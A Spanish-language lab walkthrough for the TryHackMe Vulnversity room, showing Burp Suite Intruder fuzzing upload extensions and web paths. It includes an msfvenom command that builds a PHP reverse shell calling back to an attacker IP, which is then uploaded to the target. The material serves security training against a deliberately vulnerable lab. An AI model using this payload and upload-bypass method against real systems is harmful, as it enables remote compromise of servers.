Maquinas a utilizar **Kali Linux y Laboratorio de Try Hack Me Vulnversity** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

Una funcionalidad muy poderosa que tiene burp suite es el intruder, el cual nos permitirá realizar ataques de diccionarios en cualquier parte de nuestras peticiones HTTP. Por lo que en esta ocasión, veremos cómo hacer fuzzing utilizando un diccionario con burp suite.

  

- Como hicimos anteriormente ponemos la configuración del navegador web.
    
    **Ajustes → Settings**
    
    **General→ Network Settings**
    
    **Manual proxy configuration**
    
    **HTTP Proxy: 127.0.0.1 Port: 8080**
    

  

- Activamos la interceptación en BurpSuite
    
    **Proxy → intercept on**
    
      
    
- Subimos el archivo malicioso que habíamos creado con el siguiente comando:
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![[Imagenes/image 37.png|image 37.png]]
    
      
    
    ![[Imagenes/image 1 26.png|image 1 26.png]]
    

  

- Vamos a enviar la petición al **Intruder.** Damos clip derecho y **Send to Intruder.**
    
    ![[Imagenes/image 2 25.png|image 2 25.png]]
    

![[Imagenes/image 3 24.png|image 3 24.png]]

- Seleccionamos todo y pulsamos en el botón Clear.
    
    ![[Imagenes/image 4 23.png|image 4 23.png]]
    
- En un terminal creamos un archivo txt donde vamos a meter nombre de extensiones, las que se nos ocurran.
    
    ```Bash
    nano extensiones.txt
    ```
    
    ![[Imagenes/image 5 22.png|image 5 22.png]]
    

- Vamos a decirle a BurpSuite que vaya probado línea a línea del archivo extensiones.txt hasta acertar con la extensión.
    
    Escogemos el texto donde quiero aplicar la sustitución y pulsamos el **botón Add.**
    
    ![[Imagenes/image 6 20.png|image 6 20.png]]
    
      
    
    ![[Imagenes/image 7 18.png|image 7 18.png]]
    

- Nos vamos a la **pestaña Settings** dentro de **Intruder.**
    
    ![[Imagenes/image 8 16.png|image 8 16.png]]
    

- En **Grep - Extrac**t , activamos la casilla “**Extract the following items…**” esta parte es importante ya que así sabremos si un intento fue exitoso o no. Y pulsamos el botón **Add**
    
    ![[Imagenes/image 9 15.png|image 9 15.png]]
    

  

- Pulsamos en el botón **Fetch response**
    
    ![[Imagenes/image 10 15.png|image 10 15.png]]
    
      
    
    ![[Imagenes/image 11 12.png|image 11 12.png]]
    

- Selecciono el mensaje de error y pulsamos OK
    
    ![[Imagenes/image 12 12.png|image 12 12.png]]
    
    BurpSuit nos guarda la regla.
    
    ![[Imagenes/image 13 12.png|image 13 12.png]]
    
    Cuando el mensaje sea diferente nos lo indicara.
    

  

- Nos vamos a la pestaña **Payloads**. Y en **Payload configuration** pulsamos en el botón **Load** para cargar muestro archivo de extensiones.txt.
    
    ![[Imagenes/image 14 10.png|image 14 10.png]]
    
    ![[Imagenes/image 15 9.png|image 15 9.png]]
    
      
    
- Pulsamos en el botón **Star attack**
    
    ![[Imagenes/image 16 6.png|image 16 6.png]]
    
    ![[Imagenes/image 17 4.png|image 17 4.png]]
    

  

  

---

  

  

Con BurpSuite en caso de no tener otras herramientas también podríamos hacer **Fuzzing Web.**

  

- Activamos **intercept on en BurpSuite**
- En el navegador ponemos la URL de la pagina web `http://10.10.15.36:3333/`
    
    ![[Imagenes/image 18 3.png|image 18 3.png]]
    
      
    
    ![[Imagenes/image 19 3.png|image 19 3.png]]
    

  

- Añadimos lo **/test** a la primera línea de la siguiente forma y lanzamos el **Intruder**
    
    ![[Imagenes/image 20 3.png|image 20 3.png]]
    

  

- Escogemos tests y pulsamos Add
    
    ![[Imagenes/image 21 2.png|image 21 2.png]]
    

  

- Pestaña **Payload** y en **Payload confiration** le añadiríamos en **Load la ubicación del diccionario (que no sea muy grande o se bloquea)** a utilizar o mediante el botón de **add** le podríamos **manualmente** la palabras que queremos que nos busque.
    
    ![[Imagenes/image 22 2.png|image 22 2.png]]
    

  

- Pulsamos en **Start attack**
    
    ![[Imagenes/image 23 2.png|image 23 2.png]]